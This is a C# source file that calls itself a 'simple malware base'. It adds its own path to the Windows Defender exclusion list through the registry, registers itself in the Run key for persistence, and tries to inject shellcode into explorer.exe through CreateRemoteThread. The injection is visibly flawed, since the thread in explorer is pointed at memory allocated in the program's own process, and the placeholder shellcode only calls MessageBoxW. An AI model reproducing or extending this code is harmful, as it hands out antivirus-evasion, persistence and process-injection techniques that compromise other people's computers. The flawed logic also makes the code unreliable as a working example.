// Simple malware base which injects into explorer.exe and runs shellcode, whilst simultaneously adding itself as an exclusion to WD and a startup file.
//
//         ▄▀▀▄ █  ▄▀▀█▀▄    ▄▀▄▄▄▄   ▄▀▀▀▀▄  
//        █  █ ▄▀ █   █  █  █ █    ▌ █      █ 
//        ▐  █▀▄  ▐   █  ▐  ▐ █      █      █  
//          █   █     █       █      ▀▄    ▄▀   
//        ▄▀   █   ▄▀▀▀▀▀▄   ▄▀▄▄▄▄▀   ▀▀▀▀    
//        █    ▐  █       █ █     ▐           
//        ▐       ▐       ▐ ▐                 

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using Microsoft.Win32;
using System.Text;

namespace InjectExplorer
{
    class main
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibrary(string dllToLoad);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        static void Main(string[] args)
        {
            // WD exclusion
            string exclusionPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            string exclusionName = System.IO.Path.GetFileName(exclusionPath);
            try
            {
                Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths");
                key.SetValue(exclusionName, exclusionPath);
                Console.WriteLine(exclusionName + " added as an exclusion.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("An error occurred while trying to add " + exclusionName + " to the exclusion list in Windows Defender: " + ex.Message);
            }

            // add to startup
            string exeName = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            Microsoft.Win32.RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rkApp.SetValue(System.AppDomain.CurrentDomain.FriendlyName, exeName);

            Process[] explorer = Process.GetProcessesByName("explorer");
            if (explorer.Length == 0)
            {
                Console.WriteLine("Windows explorer not found.");
                return;
            }

            IntPtr hModule = LoadLibrary("user32.dll");
            if (hModule == IntPtr.Zero)
            {
                Console.WriteLine("Could not load library.");
                return;
            }

            IntPtr lpAddress = GetProcAddress(hModule, "MessageBoxW");
            if (lpAddress == IntPtr.Zero)
            {
                Console.WriteLine("Could not find procedure.");
                return;
            }

            uint oldProtect;
            if (!VirtualProtect(lpAddress, (UIntPtr)5, 0x40, out oldProtect))
            {
                Console.WriteLine("Could not change memory protection.");
                return;
            }

            byte[] shellcode = new byte[]
            {
                0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, 0x00000000
                0xFF, 0xD0                      // call eax

            };


            Array.Copy(BitConverter.GetBytes((int) lpAddress), 0, shellcode, 1, 4);

            IntPtr lpBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, 0x1000, 0x40);
            if (lpBuffer == IntPtr.Zero)
            {
                Console.WriteLine("Could not allocate memory.");
                return;
            }

            Marshal.Copy(shellcode, 0, lpBuffer, shellcode.Length);       

            IntPtr threadId;
            IntPtr hThread = CreateRemoteThread(explorer[0].Handle, IntPtr.Zero, 0, lpBuffer, IntPtr.Zero, 0, out threadId);
                if (hThread == IntPtr.Zero)
                {
                    Console.WriteLine("Could not create remote thread.");
                    return;
                }

                WaitForSingleObject(hThread, 0xFFFFFFFF);

                VirtualFree(lpBuffer, UIntPtr.Zero, 0x8000);
        }
    }
}

